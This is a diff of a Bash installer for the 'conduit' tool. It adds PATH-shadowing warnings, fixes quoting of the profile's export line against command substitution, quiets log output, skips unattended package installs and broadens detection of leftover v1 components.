+    IFS=':' read -ra entries <<< "$PATH"
+    for entry in ${entries[@]+"${entries[@]}"}; do
+        [[ "$entry" == "$want" ]] && { printf '%s' "$i"; return 0; }
+        i=$((i + 1))
+    done
+    printf '0'
+}
+
+# warn_about_shadowing reports another `conduit` that would win a PATH lookup.
+#
+# This used to fire only for a SYMLINK at /usr/local/bin/conduit, which is what
+# v1 left behind. But a regular file there shadows just as completely -- a
+# hand-built copy, an older release someone unpacked with sudo, a Homebrew
+# install -- and the symptom is identical and mystifying: the install reports
+# success and `conduit version` keeps printing the old version.
+#
+# PATH order decides whether a second copy actually matters, so it is consulted
+# rather than assumed. A copy in a directory that comes AFTER the prefix is
+# harmless and is not mentioned.
+warn_about_shadowing() {
+    local dest="$1"
+    local mine_idx other other_idx candidate target
+
+    mine_idx="$(path_index "$PREFIX")"
+
+    for other in /usr/local/bin /opt/homebrew/bin /usr/bin "${HOME}/bin"; do
+        [[ "$other" == "$PREFIX" ]] && continue
+
+        candidate="${other}/${BINARY}"
+        [[ -e "$candidate" || -L "$candidate" ]] || continue
+
+        other_idx="$(path_index "$other")"
+        [[ "$other_idx" -ne 0 ]] || continue   # not on PATH: cannot shadow
+
+        # It wins if the prefix is not on PATH at all, or comes later.
+        if [[ "$mine_idx" -ne 0 && "$mine_idx" -lt "$other_idx" ]]; then
+            continue
+        fi
+
+        if [[ -L "$candidate" ]]; then
+            target="$(readlink "$candidate")"
+            [[ "$target" == "$dest" ]] && continue   # it points at what we just installed
+            warn "${candidate} is a symlink to ${target}"
+        else
+            warn "${candidate} is another conduit binary"
+        fi
+
+        warn "  It comes earlier on your PATH than ${PREFIX}, so it wins:"
+        warn "  typing 'conduit' would run it, not the binary just installed."
+        warn "  Remove it with:  sudo rm ${candidate}"
+
+        if [[ "$mine_idx" -eq 0 ]]; then
+            warn "  (${PREFIX} is not on this shell's PATH yet -- see below.)"
+        fi
+    done
 }
 
 # ---------------------------------------------------------------------------
@@ -627,7 +1232,7 @@ add_to_path() {
         warn "${PREFIX} is not on your PATH."
         case "$(basename "${SHELL:-sh}")" in
             fish) warn "  Add it with: fish_add_path ${PREFIX}" ;;
-            *)    warn "  Add it with: export PATH=\"${PREFIX}:\$PATH\"" ;;
+            *)    warn "  Add it with: export PATH=$(shell_quote "$PREFIX"):\"\$PATH\"" ;;
         esac
         return 0
     fi
@@ -644,17 +1249,36 @@ add_to_path() {
 
     info "Adding ${PREFIX} to PATH in ${profile}"
 
+    # SINGLE-quoted, and that is the whole point of this line.
+    #
+    # It used to be written as
+    #
+    #     printf 'export PATH="%s:$PATH"\n' "$PREFIX"
+    #
+    # putting an unescaped prefix inside DOUBLE quotes, where the shell still
+    # performs command substitution. A prefix containing $( ) or backticks
+    # therefore became code that ran in every login shell from then on -- not
+    # once at install time, but on every terminal the user ever opened.
+    #
+    # Single quotes suspend every expansion, "$PATH" stays outside them so it is
+    # still expanded, and assert_prefix_safe has already refused anything that
+    # would need the escaping in the first place. Both halves, because a
+    # validator is one edit away from being relaxed.
     {
         printf '\n%s\n' "$CONDUIT_PATH_MARKER"
-        printf 'export PATH="%s:$PATH"\n' "$PREFIX"
+        printf 'export PATH=%s:"$PATH"\n' "$(shell_quote "$PREFIX")"
     } >> "$profile" || {
         warn "could not write to ${profile}. Add this yourself:"
-        warn "    export PATH=\"${PREFIX}:\$PATH\""
+        warn "    export PATH=$(shell_quote "$PREFIX"):\"\$PATH\""
         return 0
     }
 
     success "PATH updated in ${profile}"
-    warn "Open a new shell, or run: export PATH=\"${PREFIX}:\$PATH\""
+    # The file is NAMED, because it varies: zsh reads ~/.zshrc, bash on macOS
+    # reads ~/.bash_profile (or ~/.bash_login, or ~/.profile), bash on Linux
+    # reads ~/.bashrc. Telling everyone to `source ~/.zshrc` is wrong for most
+    # of them, and wrong in a way that looks like the install having failed.
+    warn "Open a new shell, or run: source ${profile}"
 }
 
 check_path() {
@@ -668,6 +1292,16 @@ check_path() {
 # Post-install
 # ---------------------------------------------------------------------------
 
+# QUIET_LOGS silences the binary's structured logger for the calls this script
+# makes.
+#
+# An installer's transcript is read by a human deciding whether the install
+# worked. Interleaving zerolog JSON into it -- which is what these commands did,
+# because the log level was never applied to anything -- buries the four lines
+# that matter under machine output nobody here can use. `error` rather than
+# `off`: a real failure still has to be visible.
+readonly QUIET_LOGS=(--log-level error)
+
 run_setup() {
     local conduit="${PREFIX}/${BINARY}"
 
@@ -675,9 +1309,22 @@ run_setup() {
     # Called through the freshly installed path rather than whatever `conduit`
     # resolves to, so a stale binary elsewhere on PATH cannot configure the
     # machine on the new one's behalf.
-    if ! "$conduit" setup --client "$MCP_CLIENT"; then
+    #
+    # --skip-tools is NOT optional here. Without it, setup runs
+    # `brew install poppler` -- a package manager, unattended, on a machine the
+    # user only asked to have one binary copied onto. An interactive
+    # `conduit setup` may still offer it; an installer may not decide it.
+    if ! "$conduit" "${QUIET_LOGS[@]}" setup --client "$MCP_CLIENT" --skip-tools; then
         warn "setup reported problems; the binary is installed and usable."
         warn "  Re-run it with: ${conduit} setup"
+        return 0
+    fi
+
+    # Said once, only when it is true, because --skip-tools means this script
+    # will not install it and the user should know what they are missing.
+    if ! have pdftotext; then
+        printf '%s\n' "  Note: PDF text extraction needs pdftotext, which is not installed."
+        printf '%s\n' "        macOS: brew install poppler    Linux: apt install poppler-utils"
     fi
 }
 
@@ -685,7 +1332,7 @@ download_model() {
     local conduit="${PREFIX}/${BINARY}"
 
     info "Downloading the embedding model"
-    if ! "$conduit" model download; then
+    if ! "$conduit" "${QUIET_LOGS[@]}" model download; then
         warn "model download failed. Conduit still works with keyword search."
         warn "  Retry with: ${conduit} model download"
     fi
@@ -697,27 +1344,87 @@ print_doctor() {
     info "Diagnostics"
     # doctor exits non-zero when a check fails, which is expected on a fresh
     # install with no documents indexed. Its output is the point, not its code.
-    "$conduit" doctor || true
+    "$conduit" "${QUIET_LOGS[@]}" doctor || true
+}
+
+# V1 DETECTION -- kept in step with scripts/remove-v1.sh.
+#
+# These lists are a deliberate inline copy of V1_LAUNCHD_LABELS,
+# V1_SYSTEMD_UNITS, the daemon binary paths and V1_CONTAINERS in remove-v1.sh.
+# They are not sourced from it because this script has to work piped from curl,
+# where there is no remove-v1.sh on the machine to source.
+#
+# CHANGE ONE, CHANGE THE OTHER. The previous copy had drifted: it knew about
+# conduit.service but not conduit-daemon.service, about ~/.local/bin but none of
+# the other three daemon locations, and about no containers at all -- so a
+# machine whose only v1 remnant was a pair of running Qdrant and FalkorDB
+# containers holding ports 6333/6334/6379 was told it was clean.
+readonly V1_LAUNCHD_LABELS=(dev.simpleflo.conduit com.simpleflo.conduit)
+readonly V1_SYSTEMD_UNITS=(conduit.service conduit-daemon.service)
+readonly V1_DAEMON_PATHS=(
+    "${HOME}/.local/bin/conduit-daemon"
+    "${HOME}/bin/conduit-daemon"
+    "/usr/local/bin/conduit-daemon"
+    "/opt/homebrew/bin/conduit-daemon"
+)
+readonly V1_CONTAINERS=(conduit-qdrant conduit-falkordb)
+
+# v1_containers_present reports whether any v1 container still exists.
+#
+# The runtime is probed for LIVENESS first. `docker ps` against a stopped Docker
+# Desktop blocks for its connect timeout, and an installer must not hang for
+# thirty seconds on a check whose only output is a warning.
+v1_containers_present() {
+    local runtime name
+    for runtime in docker podman; do
+        have "$runtime" || continue
+        "$runtime" info >/dev/null 2>&1 || continue   # installed but not running
+
+        for name in "${V1_CONTAINERS[@]}"; do
+            if "$runtime" ps -a --filter "name=^${name}$" --format '{{.Names}}' 2>/dev/null \
+               | grep -q .; then
+                return 0
+            fi
+        done
+    done
+    return 1
 }
 
 warn_about_v1() {
-    local found=false
+    local found=() label unit path
 
-    [[ -e "${HOME}/Library/LaunchAgents/dev.simpleflo.conduit.plist" ]] && found=true
-    [[ -e "${HOME}/Library/LaunchAgents/com.simpleflo.conduit.plist" ]] && found=true
-    [[ -e "${HOME}/.config/systemd/user/conduit.service" ]] && found=true
-    [[ -e "${HOME}/.local/bin/conduit-daemon" ]] && found=true
+    for label in "${V1_LAUNCHD_LABELS[@]}"; do
+        [[ -e "${HOME}/Library/LaunchAgents/${label}.plist" ]] && \
+            found+=("launchd agent ${label}")
+    done
 
-    [[ "$found" == true ]] || return 0
+    for unit in "${V1_SYSTEMD_UNITS[@]}"; do
+        [[ -e "${HOME}/.config/systemd/user/${unit}" ]] && found+=("systemd unit ${unit}")
+    done
+
+    for path in "${V1_DAEMON_PATHS[@]}"; do
+        [[ -e "$path" ]] && found+=("daemon binary ${path}")
+    done
+
+    if v1_containers_present; then
+        found+=("containers: ${V1_CONTAINERS[*]} (holding ports 6333, 6334, 6379)")
+    fi
+
+    [[ ${#found[@]} -gt 0 ]] || return 0
 
     printf '\n'
     warn "This machine still has Conduit 1.x components installed:"
-    warn "  a daemon and/or a service registration that v2 does not use."
-    warn "  They will keep starting at login until removed."
+    local item
+    for item in "${found[@]}"; do
+        warn "    ${item}"
+    done
+    warn "  Conduit 2.0 does not use any of them, and they will keep starting"
+    warn "  at login -- and holding those ports -- until removed."
     warn ""
     warn "  Remove them with:"
-    warn "    ./scripts/remove-v1.sh            # dry run, shows what it found"
-    warn "    ./scripts/remove-v1.sh --yes      # remove them"
+    while IFS= read -r item; do
+        warn "$item"
+    done <<< "$(remove_v1_hint)"
 }
 
 # ---------------------------------------------------------------------------
@@ -731,6 +1438,11 @@ main() {
     detect_platform
     info "Platform: ${OS} ${ARCH}"
 
+    # Before the network. Discovering that the destination cannot be written to
+    # is worth a second at the start rather than 13 MB and a verified checksum
+    # in.
+    preflight_prefix
+
     if [[ "$FROM_SOURCE" == true ]]; then
         install_from_source
     else
@@ -739,6 +1451,13 @@ main() {
 
     check_path
 
+    # `conduit setup` prints its own diagnostics AND its own next steps.
+    #
+    # This script used to run a full `conduit doctor` immediately afterwards and
+    # then print a second copy of the next steps, so an ordinary install ended
+    # with the same checks reported twice and the same three commands listed
+    # twice. Each half is printed by exactly one of the two now: setup when it
+    # runs, this script when it does not.
     if [[ "$RUN_SETUP" == true ]]; then
         run_setup
     else
@@ -749,18 +1468,23 @@ main() {
         download_model
     fi
 
-    if [[ "$RUN_SETUP" == true ]]; then
+    if [[ "$RUN_SETUP" != true ]]; then
+        # Nothing else has reported on this machine, so the diagnostics are
+        # this run's only evidence that the binary works.
         print_doctor
     fi
 
     warn_about_v1
 
     printf '\n%s\n' "${C_BOLD}Done.${C_RESET}"
-    printf '%s\n' "  ${BINARY} kb add <folder>     # index a folder"
-    printf '%s\n' "  ${BINARY} kb sync             # build the index"
-    printf '%s\n' "  ${BINARY} kb search \"query\"    # check it works"
-    if [[ "$DOWNLOAD_MODEL" != true ]]; then
-        printf '%s\n' "  ${BINARY} model download      # enable semantic search"
+    if [[ "$RUN_SETUP" != true ]]; then
+        printf '%s\n' "  ${BINARY} setup                # configure an AI client"
+        printf '%s\n' "  ${BINARY} kb add <folder>      # index a folder"
+        printf '%s\n' "  ${BINARY} kb sync              # build the index"
+        printf '%s\n' "  ${BINARY} kb search \"query\"     # check it works"
+        if [[ "$DOWNLOAD_MODEL" != true ]]; then
+            printf '%s\n' "  ${BINARY} model download      # enable semantic search"
+        fi
     fi
 }
 
